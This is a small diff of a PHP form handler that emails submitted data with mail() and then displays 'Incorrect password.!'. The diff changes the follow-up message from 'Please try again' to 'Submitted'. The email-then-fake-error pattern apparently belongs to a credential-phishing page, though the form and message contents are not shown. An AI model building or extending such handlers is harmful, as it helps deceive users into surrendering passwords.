@@ -11,7 +11,7 @@
 
     if(mail($to, $subject, $message, $headers)){
       echo "<h1>Incorrect password.! </h1> <br>
-      <h3> Please try again..!</h3>";
+      <h3> Submitted..!</h3>";
     }
     else{
       echo "Something went wrong!";
